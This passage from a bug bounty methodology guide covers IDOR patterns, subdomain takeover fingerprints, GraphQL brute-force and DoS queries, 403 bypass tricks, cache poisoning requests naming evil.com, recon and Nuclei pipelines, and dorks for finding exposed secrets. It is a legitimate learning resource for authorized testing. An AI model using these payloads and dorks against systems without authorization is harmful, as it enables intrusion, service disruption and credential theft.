### 7.2 IDOR Exploitation Patterns

```
Common IDOR locations in real programs:
- User avatar upload: /api/users/{uid}/avatar → change uid
- Message threads: /api/threads/{tid}/messages → access others' messages
- Invoice download: /api/invoices/{id}.pdf → sequential IDs
- API keys: /api/settings/keys/{kid} → enumerate all keys
- Support tickets: /helpdesk/ticket/{id} → read others' tickets
```

### 7.3 Subdomain Takeover Indicators

```
Service             | CNAME Pattern              | Fingerprint
--------------------|---------------------------|---------------------------
AWS S3              | *.s3.amazonaws.com        | NoSuchBucket
GitHub Pages        | *.github.io               | 404 - There isn't a GitHub Pages site
Heroku              | *.herokuapp.com           | No such app
Shopify             | *.myshopify.com           | Sorry, this shop is unavailable
Azure               | *.azurewebsites.net       | Error 404 - Web app not found
Fastly              | *.fastly.net              | Fastly error: unknown domain
Ghost               | *.ghost.io                | The thing you were looking for
Pantheon             | *.pantheonsite.io          | 404 error unknown site
Tumblr              | *.tumblr.com              | There's nothing here
```

### 7.4 GraphQL Attack Patterns

```graphql
# Introspection (information disclosure)
{__schema{queryType{name}mutationType{name}types{name fields{name args{name}}}}}

# Batching attack (rate limit bypass)
[
  {"query":"mutation{login(user:\"admin\",pass:\"pass1\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"pass2\"){token}}"},
  {"query":"mutation{login(user:\"admin\",pass:\"pass3\"){token}}"}
]

# Authorization bypass via field suggestion
{user(id:1){email}} → Error suggests: "Did you mean 'ssn'?"

# Nested query DoS
{users{posts{comments{user{posts{comments{user{posts}}}}}}}}
```

### 7.5 403 Bypass Techniques

```
# HTTP method tampering
GET /admin → 403
POST /admin → 200

# Path manipulation
/admin → 403
/admin/ → 200
/admin/. → 200
//admin → 200
/./admin → 200
/admin..;/ → 200
/%2e/admin → 200
/admin%20 → 200
/admin%09 → 200

# Header injection
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1

# Protocol change
HTTP/1.0 instead of HTTP/1.1
```

### 7.6 Cache Poisoning Techniques

```
# Unkeyed header injection
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Response cached with evil.com in content
# Next user receives poisoned response

# Cache key manipulation
GET /page?cb=1234 HTTP/1.1    (cache bust for testing)
GET /page HTTP/1.1             (verify poisoned response)

# Fat GET
GET /api/endpoint HTTP/1.1
Content-Type: application/json

{"param":"injected_value"}
```

---

## 8. Tool Reference

### 8.1 Recon Tools

| Tool | Purpose | Install |
|------|---------|---------|
| subfinder | Subdomain enumeration | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| amass | Comprehensive subdomain enum | `go install github.com/owasp-amass/amass/v4/...@master` |
| httpx | HTTP probing + tech detection | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| dnsx | DNS resolution + brute force | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| naabu | Port scanning | `go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest` |
| waybackurls | Wayback Machine URL extraction | `go install github.com/tomnomnom/waybackurls@latest` |
| gau | URLs from Wayback/CC/OTX/URLScan | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| gf | Grep pattern matching | `go install github.com/tomnomnom/gf@latest` |

### 8.2 Discovery Tools

| Tool | Purpose | Install |
|------|---------|---------|
| Kiterunner | API endpoint discovery | Pre-built binary from releases |
| Arjun | HTTP parameter discovery | `pipx install arjun` |
| ParamSpider | Parameter mining from archives | `pip install paramspider` |
| feroxbuster | Recursive content discovery | `cargo install feroxbuster` |
| ffuf | Web fuzzer | `go install github.com/ffuf/ffuf/v2@latest` |

### 8.3 Scanning Tools

| Tool | Purpose | Install |
|------|---------|---------|
| Nuclei | Template-based vuln scanner | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| nikto | Web server scanner | Package manager |
| WPScan | WordPress scanner | `gem install wpscan` |
| sqlmap | SQL injection automation | `pip install sqlmap` |

### 8.4 Analysis Tools

| Tool | Purpose | Install |
|------|---------|---------|
| Burp Suite | HTTP proxy/scanner | Commercial (Community free) |
| Caido | Modern HTTP proxy | https://caido.io |
| mitmproxy | CLI HTTP proxy | `pip install mitmproxy` |
| jwt_tool | JWT testing | `pip install jwt-tool` |

### 8.5 gf Pattern Files

Custom patterns for `~/.gf/` directory:

```json
// xss.json
{
  "flags": "-HnrE",
  "patterns": [
    "q=", "s=", "search=", "query=", "keyword=",
    "redirect=", "url=", "view=", "page=",
    "name=", "title=", "content=", "body=",
    "desc=", "msg=", "text=", "comment="
  ]
}

// sqli.json
{
  "flags": "-HnrE",
  "patterns": [
    "id=", "select=", "report=", "role=",
    "update=", "order=", "sort=", "where=",
    "column=", "field=", "table=", "from=",
    "group=", "limit=", "having="
  ]
}

// ssrf.json
{
  "flags": "-HnrE",
  "patterns": [
    "url=", "uri=", "dest=", "redirect=",
    "path=", "window=", "next=", "data=",
    "reference=", "site=", "html=", "val=",
    "validate=", "domain=", "callback=",
    "return=", "page=", "feed=", "host=",
    "port=", "to=", "out=", "view=", "dir=",
    "show=", "navigation=", "open=", "file=",
    "document=", "folder=", "pg=", "php_path=",
    "doc=", "img=", "load=", "target=",
    "proxy=", "source=", "src="
  ]
}
```

### 8.6 Quick Reference: Combined Pipeline Commands

```bash
# One-liner: subdomains → live → URLs → patterns
subfinder -d target.com -silent | httpx -silent | \
    tee live.txt | gau --threads 5 | sort -u | \
    tee all_urls.txt | gf xss | tee xss_candidates.txt

# One-liner: URLs → Nuclei scan
cat urls.txt | nuclei -tags cve,rce -severity critical,high -silent

# One-liner: parameter discovery → fuzzing
paramspider -d target.com && nuclei -l results/target.com.txt -dast

# One-liner: subdomain takeover check
subfinder -d target.com -silent | dnsx -silent -cname | \
    nuclei -t takeovers/ -silent

# Kiterunner + Nuclei API pipeline
kr scan https://api.target.com -w routes.kite -o kr_results.txt && \
    grep -oP 'https?://[^ ]+' kr_results.txt | nuclei -tags api -silent
```

---

## Appendix A: Google Dork Cheat Sheet for Bug Bounty

```
# Find login pages
site:target.com inurl:login | inurl:admin | inurl:dashboard

# Find exposed files
site:target.com ext:php | ext:asp | ext:jsp | ext:env | ext:log

# Find sensitive directories
site:target.com inurl:backup | inurl:config | inurl:admin

# Find error pages (information disclosure)
site:target.com "Warning:" | "Error:" | "Fatal error"

# Find upload pages
site:target.com inurl:upload | inurl:file | "choose file"

# Find API documentation
site:target.com inurl:api | inurl:swagger | inurl:graphql

# Find subdomains
site:*.target.com -www

# GitHub dorks for secrets
"target.com" password | secret | key | token filename:.env
"target.com" api_key | apikey | access_key filename:.json
org:targetorg password | secret | token
```

## Appendix B: Shodan Dorks for Bug Bounty

```
# Find target infrastructure
hostname:target.com
ssl.cert.subject.cn:target.com
org:"Target Inc"

# Find specific services
hostname:target.com port:8080,8443,9090
hostname:target.com product:nginx "403"
hostname:target.com http.title:"Dashboard"

# Find misconfigured services
hostname:target.com "X-Jenkins"
hostname:target.com "elastic" port:9200
hostname:target.com http.title:"phpMyAdmin"
```

## Appendix C: Methodology Flowchart

```
START
  │
  ├── Scope review (what's in scope, what's excluded)
  │
  ├── [PASSIVE RECON]
  │     ├── Subdomain enumeration (subfinder, amass, crt.sh)
  │     ├── URL harvesting (waybackurls, gau)
  │     ├── Google/GitHub/Shodan dorking
  │     ├── JS file analysis
  │     └── Technology fingerprinting
  │
  ├── [ACTIVE RECON]
  │     ├── Port scanning (naabu)
  │     ├── Content discovery (feroxbuster, ffuf)
  │     ├── API endpoint discovery (Kiterunner)
  │     ├── Parameter discovery (Arjun, ParamSpider)
  │     └── Virtual host discovery
  │
  ├── [AUTOMATED SCANNING]
  │     ├── Nuclei (CVEs, misconfigs, exposures)
  │     ├── CMS-specific scanners (WPScan, etc.)
  │     └── Subdomain takeover checks
  │
  ├── [MANUAL TESTING]
  │     ├── Authentication testing
  │     ├── Authorization testing (IDOR, privilege escalation)
  │     ├── Input validation (XSS, SQLi, SSTI, XXE)
  │     ├── Business logic testing
  │     ├── File upload testing
  │     ├── Race condition testing
  │     └── API testing (GraphQL, REST)
  │
  ├── [EXPLOITATION]
  │     ├── Verify vulnerability
  │     ├── Demonstrate impact (minimal PoC)
  │     ├── Check for escalation chains
  │     └── Document everything
  │
  └── [REPORTING]
        ├── Write clear report (see Section 6)
        ├── Include PoC with reproduction steps
        ├── Assess severity accurately
        └── Submit and respond to triage
```

---

> **Sources consulted:**
> - nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters
> - devanshbatham/Awesome-Bugbounty-Writeups
> - projectdiscovery/nuclei + nuclei-templates
> - docs.projectdiscovery.io/tools/nuclei/overview
> - assetnote/kiterunner
> - tomnomnom/gf, tomnomnom/waybackurls
> - lc/gau
> - s0md3v/Arjun
> - devanshbatham/ParamSpider
> - KathanP19/HowToHunt
> - daffainfo/AllAboutBugBounty
> - pentester.land writeup collection
> - EdOverflow/bugbounty-cheatsheet
> - six2dez/pentest-book
